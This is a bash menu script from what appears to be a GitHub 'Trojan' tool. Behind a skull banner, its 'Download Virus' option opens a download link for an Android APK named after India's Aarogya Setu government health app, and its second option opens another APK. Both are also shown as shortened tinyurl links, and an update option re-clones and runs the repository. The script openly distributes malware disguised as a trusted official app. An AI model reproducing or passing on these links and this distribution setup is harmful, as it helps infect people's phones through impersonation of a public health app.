clear
command -v ruby > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed, Now Installing."; apt install ruby -y; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed, Now Installing."; gem install lolcat; }
echo '
                                   █████████████████████
                                ████▀─────────────────▀████
                              ███▀───────────────────────▀███
                             ██▀───────────────────────────▀██
                            █▀───────────────────────────────▀█
                            █─────────────────────────────────█
                            █─────────────────────────────────█
                            █─────────────────────────────────█
                            █───█████─────────────────█████───█
                            █──██▓▓▓███─────────────███▓▓▓██──█
                            █──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
                            █──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
                            █▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
                            ▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
                              █▄────▀█████▀─────▀█████▀────▄█
                             ▄██───────────▄█─█▄───────────██▄
                             ███───────────██─██───────────███
                             ███───────────────────────────███
                             ▀██──██▀██──█──█──█──██▀██──██▀
                              ▀████▀ ██──█──█──█──██─▀████▀
                               ▀██▀  ██──█──█──█──██──▀██▀
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                      █▄▄█▄▄█▄▄█▄▄█ ' | lolcat -a -t -d 1 -s 500
          

echo
echo -e '\033[1m[1] Download Virus
[2] Download Antivirus
[3] Update
[4] Exit' | lolcat -s 100 -t -a -d 1
printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
        read char
        if [[ $char = "1" ]] || [[ $char = "01" ]]
        then echo
echo 'You will redirect to site...' | lolcat
sleep 2.0
xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
echo
sleep 0.2
echo -e '\033[0;32mForwarding link: \033[0;37mhttps://tinyurl.com/y7ufkdfs'
sleep 1.0
printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
read a1
cd $HOME/Trojan/
bash trojan.sh

        elif [[ $char = "2" ]] || [[ $char = "02" ]]
        then echo
echo 'You will redirect to site...' | lolcat
sleep 2.0
xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
echo
sleep 0.2
echo -e '\033[0;32mForwarding link: \033[0;37mhttps://tinyurl.com/y8rm36ux'
sleep 1.0
printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Back: \e[0m'
read a1
cd $HOME/Trojan/
bash trojan.sh

        elif [[ $char = "3" ]] || [[ $char = "03" ]]
        then
echo
echo 'Updating Please wait...' | lolcat -a
cd $HOME
rm -rf Trojan
git clone https://github.com/abhackerofficial/Trojan > /dev/null 2>&1 && cd Trojan && bash trojan.sh

        elif [[ $char = "4" ]] || [[ $char = "04" ]]
        then
clear
exit
        else
echo
        printf "\e[1;93m[!] Invalid option!\e[0m\n"
echo
    fi
